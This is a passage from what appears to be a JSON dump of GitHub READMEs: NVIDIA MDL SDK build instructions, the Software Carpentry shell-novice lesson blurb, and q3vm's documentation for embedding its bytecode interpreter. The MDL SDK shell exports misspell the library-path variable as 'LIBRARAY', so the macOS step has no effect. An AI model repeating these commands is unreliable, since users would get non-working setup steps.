[llvm.org](http:\/\/releases.llvm.org\/download.html#3.4.1).\n\nIn order to build and run all examples, you need additional third-party \nlibraries. These additional libraries are:\n\n-   **GLEW** *(2.1.0)*  \n    Linux: Install the *libglew-dev* package.  \n    Windows: Download and extract the pre-compiled binaries from \n    [glew.sourceforge.net](http:\/\/glew.sourceforge.net\/).  \n    Mac OS X: Install the *glew* package using brew.\n\n-   **GLFW** *(3.2.1)*  \n    Linux: Install the *libglfw3-dev* package.  \n    Windows: Download and extract the pre-compiled x64 binaries from \n    [glfw.org](http:\/\/www.glfw.org\/download.html).  \n    Mac OS X: Install the *glfw* package using brew.\n\n-   **NVIDIA CUDA Toolkit** *(9.0 or later)*  \n    Please follow the instructions on the \n    [CUDA Developer Website](https:\/\/developer.nvidia.com\/cuda-toolkit).\n\n-   **Qt** *(5.10.1)*  \n    Please follow the instructions on the [Qt Website](https:\/\/www.qt.io\/)  \n    To build with Qt 5.10.1 on Linux, your system's GLIBC needs to be release \n    2.14 or later.\n\n-   **DirectX Raytracing support**\n    To build the DXR example, Windows 10 version 1809 and the corresponding \n    SDK 10.0.17763.0 as well as the optional *Graphic Tools* feature are required.\n\n<a name=\"doc-build-tools\"><\/a>\nRequired tools to build the documentation:\n\n-   **Doxygen** *(1.8.4)*  \n    See the [Doxygen project page](http:\/\/www.stack.nl\/~dimitri\/doxygen\/) and \n    the [ftp archive of all releases](ftp:\/\/ftp.stack.nl\/pub\/users\/dimitri\/).\n\n-   **dot from GraphViz** *(2.40.1)* (optional)  \n    See the [GraphViz project page](https:\/\/www.graphviz.org\/).\n\n\n### Building on Windows\n\n1.  Before generating the Visual Studio 2015 solution, be sure to\n    download and extract or install the third-party libraries listed\n    above.  The following steps assume you have extracted the pre-compiled \n    binaries to a common third-party directory that is:\n\n        C:\/projects\/thirdparty\n\n2.  Open CMake-Gui, click `Browse Source...` and select the root\n    directory of the MDL SDK source checkout. This directory contains\n    the top-level *CMakeLists.txt*.  Pick a build directory that will \n    contain the files for your build system and eventually, the compiled \n    binaries.\n\n    It is recommended that you build into a subdirectory, not into the repository root.\n    *C:\/projects\/mdl-sdk\/build\/vs2015* for example is fine, assuming you cloned the repository to:\n\n        C:\/projects\/mdl-sdk\n\n3.  After clicking ``Configure``, CMake asks you to choose the\n    Generator. Select `Visual Studio 14 2015 Win64` (for newer CMake versions\n    select `x64` as platform), enter `host=x64` as toolset and click\n    `Finish`.  CMake starts to configure the build and stops several\n    times when user input is required to resolve dependencies.\n\n4.  Optionally, you can select or deselect \n    [Additional CMake Options](#additional-cmake-options) by checking and \n    un-checking the boxes next to the entries that start with *MDL*. Click\n    ``Configure`` again to continue.\n\n5.  When red error messages appear in the log, identify the dependency path \n    that is requested and resolve the error by specifying the corresponding \n    entry in CMake-Gui. Then, click ``Configure`` again to continue. Repeat \n    this step until no further errors occur.\n\n    <a name=\"thirdparty-dependencies-options\"><\/a>\n    During this process, you will need to setup the following entries:\n\n    -   **BOOST_INCLUDEDIR** in Ungrouped Entries,  \n        for example: *C:\/projects\/thirdparty\/boost_1_67_0*, which contains the *boost* directory.  \n\n    -   **FREEIMAGE_DIR** in the FREEIMAGE group,  \n        for example: *C:\/projects\/thirdparty\/freeimage_3_17_0\/Dist\/x64*\n\n    -   **GLEW_DIR** in the GLEW group,  \n        for example: *C:\/projects\/thirdparty\/glew-2.1.0*\n\n    -   **GLFW_DIR** in Ungrouped Entries,  \n        for example: *C:\/projects\/thirdparty\/glfw-3.2.1.bin.WIN64*\n\n    -   **clang_PATH** in Ungrouped Entries (only if not found in the PATH),  \n        for example: *C:\/projects\/thirdparty\/LLVM-3.4.1-win32\/bin\/clang.exe*\n\n    -   **python_PATH** in Ungrouped Entries (only of not found in the PATH),  \n        for example: *C:\/projects\/thirdparty\/python_2_7_1\/bin\/python.exe*\n\n    -   **Qt5_DIR** in Ungrouped Entries,  \n        for example: *C:\/Qt\/5.10.1\/msvc2015_64*\n\n    Note: when you installed a new Visual Studio version after installing CUDA,\n    you may have to reinstall CUDA to register it correctly with Visual Studio.\n    Otherwise, CMake won't find the CUDA compiler.\n\n6.  When all dependencies have been resolved or the corresponding examples \n    have been disabled as indicated in the CMake error messages, the log \n    will show that the configuration is done.\n\n    Generate the Visual Studio solution by clicking ``Generate`` and open it \n    afterwards using ``Open Project``. CMake-Gui is not needed anymore and\n    can be closed.\n\n    You can also open the Visual Studio solution directly from the build \n    directory.\n\n7.  For Visual Studio 2015, you may have to adapt the `Target Platform Version` under\n    `General` in the `dxr` project properties to `10.0.17763.0` to avoid getting\n    build errors. For newer Visual Studio versions, CMake will use the correct\n    platform version.\n\n8.  Use Visual Studio to build the MDL SDK library, the MDL Core library,\n    and the examples. When running the examples using the Visual Studio debugger,\n    you can provide additional command line arguments by specifying them in the\n    individual Visual Studio project settings.\n\n    You can find the example binaries in the corresponding subfolders in *build\/examples*.\n    To run the examples by double-clicking the executable in the build directories\n    or by using the command line, you need to add the location of the built libraries and\n    plugins to your environment PATH or copy them into the corresponding example \n    binary folder.\n\n    For the *mdl_sdk* examples, you need *libmdl_sdk.dll* from\n    *build\/src\/prod\/lib\/mdl_sdk* and additionally,\n    *freeimage.dll* and *nv_freeimage.dll* from\n    *build\/src\/shaders\/plugin\/freeimage*.\n\n    For the *mdl_core* examples, you need *libmdl_core.dll* from\n    *build\/src\/prod\/lib\/mdl_core* and the *freeimage.dll* from \n    *build\/src\/shaders\/plugin\/freeimage* or your third-party downloads.\n\n\n### Building on Linux\n\n1.  Before generating make files, you need to install the required\n    tools and libraries as listed [above](#thirdparty-dependencies-libs).\n\n    Building on Linux requires a developer environment including Python and \n    CMake, which can be installed using the package manager (first command \n    below). The second command will install the third-party libraries that \n    are available in the package management system:\n\n    ```bash\n    sudo apt-get install git build-essential python cmake g++-multilib\n    sudo apt-get install libboost-dev libfreeimage-dev libglew-dev libglfw3-dev\n    ```\n\n    Please note that the build also requires clang 3.4.1, which is no\n    longer available through the package manager. Please download the\n    binary as described [above](#thirdparty-dependencies-libs). In\n    the following, it is assumed that the extracted clang is the only\n    clang compiler found in the system path or, for step 3.ii, that it\n    has been extracted to:\n\n        ~\/projects\/thirdparty\/clang+llvm-3.4.1-x86_64-unknown-ubuntu12.04\/bin\/clang\n    \n2.  It is assumed that you checked out the repository in your home directory \n    as follows:\n\n    ```bash\n    git clone https:\/\/github.com\/NVIDIA\/MDL-SDK.git ~\/projects\/mdl-sdk\n    ```\n\n    Before running CMake, create a build directory that will contain \n    your make files and switch to that directory. It is recommended \n    that you build into a subdirectory, not the repository root: \n\n    ```bash\n    mkdir -p ~\/projects\/mdl-sdk\/build\/linux-x64-gcc7\n    cd ~\/projects\/mdl-sdk\/build\/linux-x64-gcc7\n    ```\n\n3.  To generate your build files, run CMake with the path to the top-level \n    *CMakeLists.txt* as the last argument.\n\n    1.  When all dependencies are installed correctly, the default settings \n        should complete the configuration without any further user \n        interactions:\n\n        ```bash\n        cmake ..\/..\/\n        ```\n\n        In this case, you can continue with Step 4.\n\n    2.  Optionally, you can use CMake options and the *-D* flags to customize \n        your build.\n\n        One or multiple of these flags can be used to enable and disable examples and logging (see \n        [Additional CMake Options](#additional-cmake-options)), for example:\n\n        ```bash\n        cmake -DMDL_BUILD_SDK_EXAMPLES=OFF -DMDL_BUILD_CORE_EXAMPLES=OFF ..\/..\/\n        ```\n\n        You can also use the flags to point CMake to custom installation \n        directories for third-party libraries. Please refer to \n        [Windows build](#thirdparty-dependencies-options) for a list of \n        supported flags. On Unix-like systems, it is assumed that the \n        specified paths contain a directory named *include* for headers \n        files and subdirectories named `lib64` or `lib` that contain shared \n        libraries. For a custom build of the GLEW library for example, the \n        call to CMake could look as follows:\n\n        ```bash\n        cmake -DGLEW_DIR=~\/thirdparty\/glew-2.1.0 ..\/..\/\n        ```\n\n        When a more recent clang compiler is installed on your system, you \n        can provide the path to a clang 3.4.1 by setting the 'clang_Path' \n        option:\n\n        ```bash\n        cmake -Dclang_PATH=~\/projects\/thirdparty\/clang+llvm-3.4.1-x86_64-unknown-ubuntu12.04\/bin\/clang ..\/..\/\n        ```\n        \n        The same applies to other dependencies like Python 2.7.\n\n        For builds using a different compiler version, you need to pass the \n        compiler names when calling CMake as follows:\n\n        ```bash\n        sudo apt-get install gcc-6 g++-6 g++-6-multilib\n        cmake -DCMAKE_C_COMPILER=\/usr\/bin\/gcc-6 -DCMAKE_CXX_COMPILER=\/usr\/bin\/g++-6 ..\/..\/\n        ```\n        \n        To create an optimized build on a Unix-like system, set the build type to *Release*:\n\n        ```bash\n        cmake -DCMAKE_BUILD_TYPE=Release ..\/..\/\n        ```\n\n    3.  In case CMake is not able to find a working CUDA compiler for the \n        examples, make sure the *nvcc* is reachable through the system PATH \n        variable before running CMake:\n\n        ```bash\n        export PATH=<CUDA_SDK_DIR>\/bin:$PATH\n        ```\n\n    4.  If Qt5 cannot be found, or you want to use an extracted package \n        rather than installing Qt on your system, you can optionally set \n        an additional environment variable before calling CMake:\n\n        ```bash\n        export Qt5_DIR=~\/Qt\/5.10.1\/gcc_64\n        ```\n\n        or pass the Qt5_DIR as CMake option:\n\n        ```bash\n        cmake -DQt5_DIR=~\/Qt\/5.10.1\/gcc_64 ..\/..\/\n        ```\n\n4.  After a successful configuration, you can run make from within the\n    specified build directory or any subdirectory that corresponds to a\n    source directory containing a *CMakeLists.txt*:\n\n    ```bash\n    make -j8\n    ```\n\n5.  Because the different MDL SDK libraries are loaded at runtime, their \n    location has to be provided in order to run an example. Therefore, \n    specify the paths to the built MDL SDK library, MDL Core library, and \n    the image plugins using the `LD_LIBRARAY_PATH` variable:\n\n    ```bash\n    export LD_LIBRARY_PATH=~\/projects\/mdl-sdk\/build\/linux-x64-gcc7\/src\/prod\/lib\/mdl_sdk:~\/projects\/mdl-sdk\/build\/linux-x64-gcc7\/src\/prod\/lib\/mdl_core:~\/projects\/mdl-sdk\/build\/linux-x64-gcc7\/src\/shaders\/plugin\/freeimage${LD_LIBRARAY_PATH:+:${LD_LIBRARAY_PATH}}\n    ```\n\n    For example, to run the MDL SDK modules example, use:\n\n    ```bash\n    cd ~\/projects\/mdl-sdk\/build\/linux-x64-gcc7\/examples\/mdl_sdk\/modules\n    .\/mdl_sdk_example-modules\n    ```\n\n### Building on Mac OS X\n\n1.  Before generating make files, you need to install the required\n    tools and libraries as listed [above](#thirdparty-dependencies-libs).\n\n    Please note that the build requires clang 3.4.1, which is no\n    longer available through the package manager. Please download the\n    binary as described [above](#thirdparty-dependencies-libs). In\n    the following, it is assumed that it has been extracted to:\n\n        ~\/projects\/thirdparty\/clang+llvm-3.4.1-x86_64-apple-darwin10.9\/bin\/clang\n\n2.  Depending on your workflow, you can use CMake-Gui and follow the [Windows instructions](#building-on-windows) \n    or use the command line as described in the [Linux section](#building-on-linux).\n    In each case, begin with step 2 of the respective instructions.\n\n    If the brew packages, Python 2.7, CUDA, and Qt have been installed correctly,\n    the following CMake options need to be specified:\n\n    -   **clang_PATH** in Ungrouped Entries,  \n        for example: *~\/projects\/thirdparty\/clang+llvm-3.4.1-x86_64-apple-darwin10.9\/bin\/clang*\n\n    -   **python_PATH** in Ungrouped Entries (only of not found in the PATH),  \n        for example: *\/usr\/bin\/python*\n\n    -   **Qt5_DIR** in Ungrouped Entries,  \n        for example: *~\/Qt\/5.10.1\/clang_64*\n\n\n3.  After successfully configuring and generating make files, switch to the selected build directory and run make:\n\n    ```bash\n    cd ~\/projects\/mdl-sdk\/build\/macosx-x64-clang810\n    make -j8\n    ```\n\n4.  Because the different MDL SDK libraries are loaded at runtime, their \n    location has to be provided in order to run an example. Therefore, \n    specify the paths to the built MDL SDK library, MDL Core library, and \n    the image plugins using the `DYLD_LIBRARAY_PATH` variable:\n\n    ```bash\n    export Qt5_DIR=~\/Qt\/5.10.1\/clang_64\n    export DYLD_LIBRARAY_PATH=~\/projects\/mdl-sdk\/build\/macosx-x64-clang810\/src\/prod\/lib\/mdl_sdk:~\/projects\/mdl-sdk\/build\/macosx-x64-clang810\/src\/prod\/lib\/mdl_core:~\/projects\/mdl-sdk\/build\/macosx-x64-clang810\/src\/shaders\/plugin\/freeimage:${Qt5_DIR}\/lib:${Qt5_DIR}\/plugins\/imageformats${DYLD_LIBRARAY_PATH:+:${DYLD_LIBRARAY_PATH}}\n    ```\n\n    For example, to run the MDL SDK modules example, use:\n\n    ```bash\n    cd ~\/projects\/mdl-sdk\/build\/macosx-x64-clang810\/examples\/mdl_sdk\/modules\n    .\/mdl_sdk_example-modules\n    ```\n\n### Additional CMake Options\n\nThe following options enable you to select the components to be built and to \nselect particular logging information:\n\n-   **MDL_BUILD_SDK_EXAMPLES**  \n    [ON\/OFF] enable\/disable the MDL SDK examples.\n\n-   **MDL_BUILD_CORE_EXAMPLES**  \n    [ON\/OFF] enable\/disable the MDL Core examples.\n\n-   **MDL_ENABLE_CUDA_EXAMPLES**  \n    [ON\/OFF] enable\/disable examples that require CUDA.\n\n-   **MDL_ENABLE_D3D12_EXAMPLES**  \n    [ON\/OFF] enable\/disable examples that require D3D12 (Windows only).\n\n-   **MDL_ENABLE_OPENGL_EXAMPLES**  \n    [ON\/OFF] enable\/disable examples that require OpenGL.\n\n-   **MDL_ENABLE_QT_EXAMPLES**  \n    [ON\/OFF] enable\/disable examples that require Qt.\n\n-   **MDL_LOG_PLATFORM_INFOS**  \n    [ON\/OFF] enable\/disable the logging of platform and CMake settings.\n\n-   **MDL_LOG_DEPENDENCIES**  \n    [ON\/OFF] enable\/disable the logging of dependencies of the individual targets.\n\n-   **MDL_LOG_FILE_DEPENDENCIES**  \n    [ON\/OFF] enable\/disable the logging of files that are copied to the output folder.\n\nBy default, all options are set to ON. For any help request, please attach \nthe log messages generated when the log options are enabled.\n\n\n### Testing the Build\n\nTo verify the build, run the examples as described above.\n\n\n### Building the API Documentation\n\nThe documentation is stored in the `doc\/` subdirectory. There are two \nC++ APIs -- the __MDL SDK API__ and the __MDL Core API__ -- for which \nyou need to generate the documentation with Doxygen. Please make sure \nto use the specified version 1.8.4.\n\nAdditional documents are the MDL Specification (PDF) and the `base.mdl` \nand `core_definitions.mdl` documentation (HTML), which you do not\nneed to generate; they are a part of the source code release.\n\n1.  The tools required to build the documentation are listed \n    [here](#doc-build-tools).\n\n2.  The use of the `dot` tool is optional and disabled by default. Enabling \n    it gives you nicer inheritance diagrams. It is only supported on Linux \n    and Mac, since a custom bash script is used to process the diagrams. You \n    can enable the `dot` tool as follows:\n\n    1.  Set the `HAVE_DOT` configuration setting in the respective `Doxyfile`\n        to `YES` in `doc\/mdl_sdkapi` and `doc\/mdl_coreapi`.\n\n    2. Set the `GRAPHVIZ_DOT_HOME` environment variable to the directory \n        containing the GraphVis `dot` command (not the local `doc\/mdl_sdkapi` \n        or `doc\/mdl_coreapi` directory with the equally named `dot` shell \n        script, which is just a wrapper). \n\n    3.  On Mac, set the `PLATFORM` environment variable to a suitable\n        setting starting with `macosx-x86`.\n\n3.  Build the __MDL SDK API__ documentation with a plain `doxygen` call:\n\n    ```bash\n    cd ~\/projects\/mdl-sdk\/doc\/mdl_sdkapi\n    doxygen\n    ```\n\n    The resulting documentation is placed in an `html\/` subdirectory with \n    the start page: \n\n    ```bash\n    ~\/projects\/mdl-sdk\/doc\/mdl_sdkapi\/html\/index.html\n    ```\n\n4.  Build the __MDL Core API__ documentation with a plain `doxygen` call:\n\n    ```bash\n    cd ~\/projects\/mdl-sdk\/doc\/mdl_coreapi\n    doxygen\n    ```\n\n    The resulting documentation is placed in an `html\/` subdirectory with\n    the start page:\n\n    ```bash\n    ~\/projects\/mdl-sdk\/doc\/mdl_coreapi\/html\/index.html\n    ```\n\nA start page that links all documents can be found in the doc directory:\n\n```bash\n~\/projects\/mdl-sdk\/doc\/index.html\n```\n\n## Repository Structure\n\nThe NVIDIA MDL SDK repository consists of the following directories and files:\n\n    include\/       - C++ API header files\n    examples\/      - example programs and MDL files\n    src\/           - source code for the SDK libraries\n    doc\/           - API documentation, MDL specification, \n                     core_definitions.mdl and base.mdl documentation\n    cmake\/         - support files for the CMAKE build system\n    \n    README.md      - this file: introduction and build instructions\n    CHANGELOG.md   - change log and difference to the binary MDL SDK release\n    LICENSE.md     - license for the MDL SDK and references to \n                     third-party licenses\n    CMakeLists.txt - top level CMAKE file\n\n\n## Additional Resources\n\n- [NVIDIA MDL Home Page](https:\/\/www.nvidia.com\/mdl)\n- [NVIDIA MDL SDK Forum](https:\/\/devtalk.nvidia.com\/default\/board\/253\/mdl-sdk\/)\n"},{"repo":"\/swcarpentry\/shell-novice","language":"HTML","readme_contents":"[![Create a Slack Account with us](https:\/\/img.shields.io\/badge\/Create_Slack_Account-The_Carpentries-071159.svg)](https:\/\/swc-slack-invite.herokuapp.com\/) \n[![Slack Status](https:\/\/img.shields.io\/badge\/Slack_Channel-swc--shell-E01563.svg)](https:\/\/swcarpentry.slack.com\/messages\/C9X3XTHJ8) \n[![DOI](https:\/\/zenodo.org\/badge\/DOI\/10.5281\/zenodo.3266823.svg)](https:\/\/doi.org\/10.5281\/zenodo.3266823)\n\nshell-novice\n============\n\nAn introduction to the Unix shell for people who have never used the command line before.\nPlease see <https:\/\/swcarpentry.github.io\/shell-novice\/> for a rendered version of this material,\n[the lesson template documentation][lesson-example]\nfor instructions on formatting, building, and submitting material,\nor run `make` in this directory for a list of helpful commands.\n\nMaintainers:\n\n* [Gabriel A. Devenyi][devenyi_gabriel]\n* [Colin Morris][colin_morris]\n* [Will Pitchers][will_pitchers]\n* [Gerard Capes][gerard_capes]\n\n[devenyi_gabriel]: http:\/\/software-carpentry.org\/team\/#devenyi_gabriel\n[colin_morris]: https:\/\/github.com\/colinmorris\n[will_pitchers]: https:\/\/software-carpentry.org\/team\/#pitchers_w\n[gerard_capes]: https:\/\/carpentries.org\/instructors\/#capes_gerard\n[lesson-example]: https:\/\/carpentries.github.io\/lesson-example\/\n"},{"repo":"\/jnz\/q3vm","language":"C","readme_contents":"Q3VM Readme\n===========\n\nA lightweight (single file: `vm.c`) embeddable interpreter\/Virtual Machine (VM) for compiled bytecode files (`.qvm`) based on good old C-language input (`.c`). A complete C compiler to generate `.qvm` files is included (LCC). The interpreter is based on the Quake III Arena virtual machine (hence the name q3vm) but the interpreter is not tied to Quake III Arena and can be used for any kind of project. For example code that needs to run in a sandbox.\n\n[![Build Status](https:\/\/travis-ci.org\/jnz\/q3vm.svg?branch=master)](https:\/\/travis-ci.org\/jnz\/q3vm)\n[![codecov](https:\/\/codecov.io\/gh\/jnz\/q3vm\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/jnz\/q3vm)\n[![Coverity](https:\/\/scan.coverity.com\/projects\/16570\/badge.svg)](https:\/\/scan.coverity.com\/projects\/jnz-q3vm)\n\n      ___   _______     ____  __\n     \/ _ \\ |___ \/\\ \\   \/ \/  \\\/  |\n    | | | |  |_ \\ \\ \\ \/ \/| |\\\/| |\n    | |_| |____) | \\ V \/ | |  | |\n     \\__\\_______\/   \\_\/  |_|  |_|\n\n\nJan Zwiener, 2018. Mail: jan@zwiener.org\n\nRead the excellent introduction to the Q3VM by Fabien Sanglard:\n\n * http:\/\/fabiensanglard.net\/quake3\/qvm.php\n\nGif: compiling a simple *hello world* example (`main.c`) and run it with the virtual machine interpreter `q3vm`.\n\n![gif](demo_vm.gif?raw=1)\n\nInstallation\n------------\n\nThe [vm.c](src\/vm\/vm.c?raw=1) and [vm.h](src\/vm\/vm.h?raw=1) files can be\ndropped into an existing C project and compiled along with it. Implement\nthe 4 callback functions in your project: `Com_malloc`,  `Com_free`, `Com_Error`\nand `systemCalls`.\n\nFeatures\n--------\n\n * Small and lightweight (one .c file to include without dependencies)\n * Battle-tested (20 years of use in Quake III Arena)\n * VM and LCC forked from the well maintained ioquake3 code base\n * Tool tested (static code analysis, test coverage, Valgrind)\n * No need to learn a new scripting language (e.g. Lua)\n * Static type checking in the language (C)\n * Static memory allocation in C, no unpredictable garbage collector\n * Plan B: you can always go back to native code, as .c files are the input\n * Great tool landscape for C. Use the tools that are available for C\n * Computed gotos are used to speed up the interpreter if you compile with GCC (see benchmark section) \n * Much faster than the Triseism Q3VM interpreter (see benchmark section)\n\nUse Cases\n---------\n\n * Sandbox for code you don't fully trust (e.g. download the bytecode from a web server)\n * Mods for hobby game engines\n * There are many virtual machines, but not many are so small, with static typing and no garbage collector\n * Learn about virtual machines in general, but directly have a C compiler available for the virtual machine\n * Sandbox for embedded applications, e.g. plug-ins for IoT applications on microcontrollers (bounded CPU time, bounded memory area, restrict access to peripheral devices)\n * There is also a historical value: learn about the Quake III engine\n\n\nQuick Intro\n-----------\n\nTwo things are required:\n\n * The interpreter\n * A bytecode binary .qvm file\n\nRun:\n\n    > q3vm.exe bytecode.qvm\n\nThe q3vm.exe standalone interpreter is not required, it is more of a demo\napplication.  You can easily add the interpreter as a single .c file to your\nproject (`vm.c` and the header `vm.h`).  Call `VM_Create` and `VM_Call` to run\nthe bytecode in your application:\n\n```c\n    #include \"vm.h\"\n\n    vm_t vm;\n    int result;\n    \n    VM_Create(&vm, \"my test\", pointerToByteCodeBuffer, sysCall);\n    result = VM_Call(&vm, 12345);\n    VM_Free(&vm);\n```\n\nThe `pointerToByteCodeBuffer` is some memory location where the bytecode is\nlocated. You can e.g. load it from a file and store it in a byte array. See\n`main.c` for an example implementation.\n\nData can be exchanged with the bytecode by the return value (result) and\narguments to `VM_Call`. Here just a 12345 is passed to the bytecode. It is up\nto the `vmMain` function in the bytecode what to do with that value.  You can pass\nmore (up to 12) optional arguments to the bytecode:\ne.g. `VM_Call(&vm, 0, 1, 2, 3, 4)`.\n\nThe `sysCall` is a callback function that you define so that the interpreter\ncan call native functions from your code. E.g. a logging function or some time\ncritical function that you don't want to implement in the bytecode. Again,\ncheck `main.c` for an example. Also check the section *How to add a custom\nnative function* for more information.\n\nA few callback functions are required, read the section *Callback functions\nrequired in host application* for more information.\n\nAnd normally you should also check if `VM_Create` returns 0 (i.e. everything is\nOK).\n\nFolder structure\n----------------\n\n    \u251c\u2500 bin\/             LCC compiler and q3asm linker output binaries\n    \u2502  \u251c\u2500 linux\/        Linux target folder for LCC compiler and q3asm linker\n    \u2502  \u2514\u2500 win32\/        Precompiled lcc.exe and q3asm.exe for Windows\n    \u251c\u2500 build\/           Temp. directory for object files\n    \u251c\u2500 doxygen\/         Doxygen config and API documentation output\n    \u251c\u2500 example\/         Example \"hello world\" firmware project (bytecode.qvm)\n    \u251c\u2500 lcc\/             The LCC compiler (compile .c files to .asm files)\n    \u251c\u2500 msvc\/            Microsoft Visual Studio 2015 project file for q3vm\n    \u251c\u2500 q3asm\/           Linker: link the LCC .asm files to a .qvm bytecode file\n    \u251c\u2500 src\/             q3vm standalone console application source code\n    \u2502  \u2514\u2500 vm\/           The core VM source, copy that folder into your project\n    \u2514\u2500 test\/            Test environment\n\nAPI Documentation\n-----------------\n\nCall `make doxygen` to autogenerate the API documentation in the `doxygen\/html`\ndirectory. Doxygen is required as well as the dot command (part of graphviz).\nInstall it with `sudo apt-get install doxygen graphviz` on Debian or Ubuntu.\n\n    > make doxygen\n\nBut you can also read `vm.h` directly for the API documentation.\n\n\nBuild VM\/interpreter\n--------------------\n\nOn **Linux**:\n\n    > make\n\nOn **Windows**:\n\nUse the **Visual Studio 2015** project `q3vm.sln` in the `msvc` subfolder.\n\nOr install MinGW64 and add the MinGW64 bin\\ directory to your path.\nSo that you have gcc.exe and mingw32-make.exe available at the command prompt.\n\n * http:\/\/mingw-w64.org\/doku.php\/download\/mingw-builds\n\nCompile with:\n\n    > mingw32-make\n\nBuild example bytecode firmware\n-------------------------------\n\n**Windows**:\n\nThe LCC compiler (lcc.exe) is included in the .\/bin\/win32 directory.\nYou need make (mingw32-make) from the MinGW64 installation in\nyour path. The Makefile calls LCC and q3asm to generate `bytecode.qvm`:\n\n    cd example\n    mingw32-make\n\nIf you don't want to use make, you can do the steps from the make file\nmanually at the command line. Compile every `.c` source code with `LCC`:\n\n    > lcc -S -Wf-target=bytecode -Wf-g YOUR_C_CODE.c\n\nThis will create .asm output files. Then link the .asm files with `q3asm` (based on a bytecode.q3asm\nlinker script):\n\n    > q3asm -f bytecode\n\nThe output of q3asm is a `.qvm` file that you can run with q3vm.\n\n\n**Linux**:\n\nBuild LCC:\n\n    > make lcc\n\nBuild q3asm\n\n    > make q3asm\n\nBuild the example bytecode:\n\n    > make example\/bytecode.qvm\n\nCallback functions required in host application\n-----------------------------------------------\n\n**malloc and free**:\n\nThe following functions are required in the host application for\nmemory allocation:\n\n```c\n    void* Com_malloc(size_t size, vm_t* vm, vmMallocType_t type);\n    {\n        (void)vm;\n        (void)type;\n        return malloc(size);\n    }\n    \n    void Com_free(void* p, vm_t* vm, vmMallocType_t type)\n    {\n        (void)vm;\n        (void)type;\n        free(p);\n    }\n```\n\nThe host can simply call `malloc` and `free` or use a custom memory allocation\nfunction or use static memory (e.g. in an embedded application). Each VM only\ncalls `Com_malloc` once per malloc type. This can be used as a help for the static memory\nallocation in an embedded environment without `malloc()` and `free()`.\n\n**Error handling**:\n\nThe following function needs to be implemented in the host application:\n\n```c\n    void Com_Error(vmErrorCode_t level, const char* error)\n    {\n        fprintf(stderr, \"Err (%i): %s\\n\", level, error);\n        exit(level);\n    }\n```\n\nThe error id is given by the `vmErrorCode_t` parameter. The `error` string describes\nwhat went wrong.  It is up to the host application how to deal with the error.\nIn this simple example we just print the error string and exit the application.\nThe error code is stored in the `vm_t::lastError` variable.\n\nHow to add a custom native function\n-----------------------------------\n\nLet's say we want to add a native function to convert a string to an integer:\n`stringToInt`.  We want to add the function to our virtual machine (step 1) and\ncall it from our example code (step 2).  (Note: there is already the `atoi` function in\nthe bytecode, but this is just an example on how to call `atoi` as a native\nfunction and deal with address translation).\n\n\n**Step 1)** Add the native function to the host application\n\nOpen `src\/main.c` and modify the `systemCalls` function. Add `case -5:` for the\nnew native function. We just use the next free id (here -5) as an identifier.\nThe identifier will be important in step 2.  The first argument\nfor `stringToInt` is the address of a string. The address is in the virtual\nmachine address space, so we can't directly use that argument (`args[1]`) for\nthe native call to `atoi`. There is a helper macro that will translate the\naddress for use: `VMA`. We need to give `VMA` the pointer argument from the\nbytecode and the virtual machine context (`vm`) to translate it.\nThe function `VM_MemoryRangeValid` makes sure that the memory range is valid. This is e.g.\nimportant for the `memcpy` call, so that the VM cannot write outside of\nthe sandbox memory.\nIt is also possible to call the VM recursively again with `VM_Call`.\n\n```c\n    \/* Call native functions from the bytecode: *\/\n    int systemCalls(vm_t* vm, int* args)\n    {\n        const int id = -1 - args[0];\n    \n        switch (id)\n        {\n        case -1: \/* PRINTF *\/\n            return printf(\"%s\", (const char*)VMA(1, vm));\n\n        case -2: \/* ERROR *\/\n            return fprintf(stderr, \"%s\", (const char*)VMA(1, vm));\n    \n        case -3: \/* MEMSET *\/\n            if (VM_MemoryRangeValid(args[1]\/*addr*\/, args[3]\/*len*\/, vm) == 0)\n            {\n                memset(VMA(1, vm), args[2], args[3]);\n            }\n            return args[1];\n    \n        case -4: \/* MEMCPY *\/\n            if (VM_MemoryRangeValid(args[1]\/*addr*\/, args[3]\/*len*\/, vm) == 0 &&\n                VM_MemoryRangeValid(args[2]\/*addr*\/, args[3]\/*len*\/, vm) == 0)\n            {\n                memcpy(VMA(1, vm), VMA(2, vm), args[3]);\n            }\n            return args[1];\n    \n        case -5: \/* stringToInt *\/                             \/\/ < NEW !!!\n            return atoi(VMA(1, vm));                           \/\/ < NEW !!!\n    \n        default:\n            fprintf(stderr, \"Bad system call: %i\\n\", id);\n        }\n        return 0;\n    }\n```\n\n**Step 2)** Tell the bytecode about this function\n\nNow we need to tell our example project about this new function `strintToInt`.\nOpen `example\/g_syscalls.asm` and add the last line. The identifier -5 is\nimportant for the mapping.\n\n    code\n    \n    equ trap_Printf             -1\n    equ trap_Error              -2\n    equ memset                  -3\n    equ memcpy                  -4\n    equ stringToInt             -5\n\n**Step 3)** Perform an example call to `strintToInt`\n\nEdit `example\/main.c` and add the function declaration:\n\n```c\n    int stringToInt(const char* a);\n```\n\nAnd call it somewhere from the `vmMain` function:\n\n```c\n    char* myStr = \"1234\";\n    printf(\"\\\"%s\\\" -> %i\\n\", myStr, stringToInt(myStr));\n```\n\nCompile everything:\n\n    > make && make example\/bytecode.qvm\n\nAnd run it:\n\n    > .\/q3vm example\/bytecode.qvm\n\nOriginal comments by John Carmack\n---------------------------------\n\nJohn Carmack's .plan for Nov 03, 1998:\n\n*I had been working under the assumption that Java was the right way to go, but recently I reached a better conclusion.*\n*The programming language for QuakeArena mods is interpreted ANSI C. (well, I am dropping the double data type, but otherwise it should be pretty conformant)*\n*The game will have an interpreter for a virtual RISC-like CPU. This should have a minor speed benefit over a byte-coded, stack based java interpreter. Loads and stores are confined to a preset block of memory, and access to all external system facilities is done with system traps to the main game code, so it is completely secure.*\n*The tools necessary for building mods will all be freely available: a modified version of LCC and a new program called q3asm. LCC is a wonderful project - a cross platform, cross compiling ANSI C compiler done in under 20K lines of code. Anyone interested in compilers should pick up a copy of \"A retargetable C compiler: design and implementation\" by Fraser and Hanson.*\n*You can't link against any libraries, so every function must be resolved. Things like strcmp, memcpy, rand, etc. must all be implemented directly. I have code for all the ones I use, but some people may have to modify their coding styles or provide implementations for other functions.*\n*It is a fair amount of work to restructure all the interfaces to not share pointers between the system and the games, but it is a whole lot easier than porting everything to a new language. The client game code is about 10k lines, and the server game code is about 20k lines.*\n*The drawback is performance. It will probably perform somewhat like QC. Most of the heavy lifting is still done in the builtin functions for path tracing and world sampling, but you could still hurt yourself by looping over tons of objects every frame. Yes, this does mean more load on servers, but I am making some improvements in other parts that I hope will balance things to about the way Q2 was on previous generation hardware.*\n*There is also the amusing avenue of writing hand 